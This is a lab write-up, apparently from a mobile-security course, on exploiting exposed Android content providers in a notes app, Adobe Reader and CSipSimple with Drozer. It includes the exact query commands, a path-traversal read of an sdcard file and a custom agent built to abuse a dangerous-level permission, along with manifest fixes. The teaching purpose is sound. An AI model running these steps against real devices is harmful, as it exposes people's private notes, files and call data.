## Exploiting Catch.apk 
#### The content of the private notes!
```
| My online banking password: $$_hing_123 |
| CC Number: 3345 1231 9834 0549          |
| Meet Sally at 15 Main St. on Friday.    |
```
#### The Hack Session! - Drozer Commands:

Following commands were used:

1. `dz> run app.package.list -f notes`

Get the package name of the notes app since I need it for further investigation. Turns out to be `com.threebanana.notes`

2. `dz> run app.provider.info -a com.threebanana.notes`

Now I want to get an overview of the available content providers. This way I can identify the content provider which is most promising to retrieve the notes, which is `com.threebanana.notes.provider.NotePad`

3. `dz> run app.provider.finduri -a com.threebanana.notes`

In order to try to read the content, I need to get the URI of the content provider.

4. `dz> run app.provider.query content://com.threebanana.notes.provider.NotePad/notes --projection "text"`

Using the given module we're able to get the content of the content provider and filter it for the text column only.

#### Cause of the vulnerability
When looking at the manifest, the content providers are created without any specific permissions:
```
<provider name=".NotePadProvider"
          authorities="com.threebanana.notes.provider.NotePad">
</provider>
```

By default everything is exposed as a result.[1]

#### Mitigation of the vulnerability

I should define custom permissions like `com.threebanana.notes.provider.permission.READ_PROVIDER` which needs to be placed in the manifest as well:
```
<provider name=".NotePadProvider"
          authorities="com.threebanana.notes.provider.NotePad"
          android:permission="com.threebanana.notes.provider.permission.READ_PROVIDER">
</provider>
```
The permission should have the *dangerous* protection level and make sure to state to the user which permission he's giving to a third party application.

If the notes should not be shared with any application, I could use the `android:exported=false` attribute (however then the content provider itself doesn't make much sense).[1]

If I only want to share data between our own apps, I can set `android:protectionLevel` to signature protection.[1]

### 2 Adobe
#### Contents of secret.txt

Content of */sdcard/secrets.txt*:
```
Whoops!!! You got me!!
```

#### Drozer Commands
1. `dz> run app.package.list -f adobe`
2. `dz> run app.provider.finduri com.adobe.reader`
3. `dz> run app.provider.read content://com.adobe.reader.fileprovider/
../../../../sdcard/secret.txt`


Notice that Step 3 uses the `app.prodivder.read` module and traverses the directory tree up to the sdcard where the wished file is located.


### 3 CSipSimple
####  How I managed to allow Drozer to read the content of the  outgoing filters database table!

By running `dz> run app.provider.info -a com.csipsimple` I noticed, that the app's content providers have set `android.permission.CONFIGURE_SIP` as read permission. 

``` 
dz> run app.provider.info -a com.csipsimple
Package: com.csipsimple
  Authority: com.csipsimple.prefs
    Read Permission: android.permission.CONFIGURE_SIP
    Write Permission: android.permission.CONFIGURE_SIP
    Content Provider: com.csipsimple.service.PreferenceProvider
    Multiprocess Allowed: False
    Grant Uri Permissions: False
  Authority: com.csipsimple.db
    Read Permission: android.permission.CONFIGURE_SIP
    Write Permission: android.permission.CONFIGURE_SIP
    Content Provider: com.csipsimple.db.DBProvider
    Multiprocess Allowed: False
    Grant Uri Permissions: False
```

In the Manifest file I see that the permission protection level is 0x1 which means dangerous and no signature protection is present.

```
dz> run app.package.manifest com.csipsimple
</uses-permission>
  <permission label="@2131427346"
              name="android.permission.USE_SIP"
              protectionLevel="0x1"
              permissionGroup="android.permission-group.COST_MONEY"
              description="@2131427347">
```

For the Drozer agent to be able to request that permission, I need to build a modified drozer agent using the command `drozer agent build --permission android.permission.CONFIGURE_SIP` and install it via `adb install custom-agent.apk`.

```
dz> run app.provider.finduri com.csipsimple
Scanning com.csipsimple...
content://com.csipsimple.db/calllogs
content://com.csipsimple.db/outgoing_filters
content://com.csipsimple.prefs/preferences/
content://com.csipsimple.prefs/
content://com.android.contacts/contacts/
content://com.csipsimple.db
content://com.csipsimple.prefs/raz
content://com.android.contacts/contacts
content://com.csipsimple.db/messages
content://com.csipsimple.db/thread
content://com.csipsimple.db/messages/
content://com.csipsimple.db/calllogs/
content://com.csipsimple.db/
content://com.csipsimple.prefs/raz/
content://com.csipsimple.prefs
content://com.csipsimple.db/accounts_status/
content://com.csipsimple.db/accounts/
content://com.csipsimple.db/accounts
content://com.csipsimple.db/accounts_status
content://com.csipsimple.prefs/preferences
content://com.csipsimple.db/thread/
content://com.csipsimple.db/outgoing_filters/
```

The content of the databse table can then be revealed by using `dz> run app.provider.query content://com.csipsimple.db/outgoing_filters` which gives us the following table dump:

```
dz> run app.provider.query content://com.csipsimple.db/outgoing_filters
| _id | priority | account | matches        | replace | action |
| 1   | 0        | -2      | ^\Q+850\E(.*)$ |         | 1      |
| 4   | 0        | 1       | ^\QS\E(.*)$    |         | 1      |
| 2   | 1        | -2      | ^\Q+1\E(.*)$   |         | 0      |
| 3   | 2        | -2      | ^\Q+4\E(.*)$   |         | 4      |
```

#### Mitigation of this vulnerbility
If the permission is defined with the signature protection level, other apps cannot request the same permission as this permission will be tied with unique signature of app itself and thus it will avoid the vulnerability.




## List of references
- [1] https://developer.android.com/training/articles/security-tips#ContentProviders
- [2] https://github.com/mwrlabs/drozer-agent
